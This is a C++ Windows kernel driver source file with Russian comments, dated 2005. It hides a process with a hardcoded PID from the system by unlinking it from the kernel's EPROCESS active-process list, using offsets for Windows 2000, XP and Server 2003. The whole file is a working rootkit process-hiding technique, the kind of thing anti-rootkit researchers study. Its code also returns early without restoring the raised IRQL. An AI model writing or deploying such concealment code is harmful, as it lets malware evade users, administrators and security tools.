// (С) Зайцев Олег, 2005
#include "StdAfx.h"
#include <ntddk.h>
#include <ntdef.h>
#include <rkdrv.h>

extern "C" 	{
	extern  PWORD NtBuildNumber; // Номер сборки NT
}


VOID HideProcessByPID(int PID) 
{
	// Смещения полей структуры EPROCESS
	ULONG ActiveProcessLinkOffset = 0; // Структура ActiveProcessLinks
	ULONG ProcessNameOffset = 0;       // Имя процесса
	ULONG PIDOffset = 0;               // PID процесса
    switch (*NtBuildNumber) {
     case  2195:  // Win 2k
      ActiveProcessLinkOffset = 0xA0;
	  ProcessNameOffset       = 0x01FC;
	  PIDOffset               = 0x09C;
	  break;
     case 2600:   // Win XP
      ActiveProcessLinkOffset = 0x88;
	  ProcessNameOffset       = 0x174;
	  PIDOffset               = 0x084;
	  break;
     case 3790:  // W2K3
      ActiveProcessLinkOffset = 0x98;
	  ProcessNameOffset       = 0x164;
	  PIDOffset               = 0x094;
	  break;
	}	
        KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
	if (ActiveProcessLinkOffset == 0) return;
	PEPROCESS   CurrentProcess    = PsGetCurrentProcess(); 
	if (!CurrentProcess) return;
	PLIST_ENTRY CurrentProcessAPL = (PLIST_ENTRY)((ULONG)CurrentProcess + ActiveProcessLinkOffset);
	PLIST_ENTRY ProcessAPL        = CurrentProcessAPL;
	ULONG ProcessPID;
	PCHAR ProcessName;
	do  {
	  ProcessPID  = *(PULONG)((ULONG)ProcessAPL - ActiveProcessLinkOffset + PIDOffset);
	  ProcessName = (PCHAR)((ULONG)ProcessAPL - ActiveProcessLinkOffset + ProcessNameOffset);
	  DbgPrint("%u", ProcessPID);	
	  if (ProcessPID == PID) {
		ProcessAPL->Flink->Blink = ProcessAPL->Blink;
		ProcessAPL->Blink->Flink = ProcessAPL->Flink;
		DbgPrint("Hide Process %u", ProcessPID);	
	  }
	  ProcessAPL = ProcessAPL -> Flink;
	} while (ProcessAPL != CurrentProcessAPL);
       KeLowerIrql(OldIRQL);
}

// ***** Точка входа в драйвер *****
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pusRegistryPath)
{
	HideProcessByPID(1204);
	// Возврат результата инициализации
	return STATUS_NOT_IMPLEMENTED;
}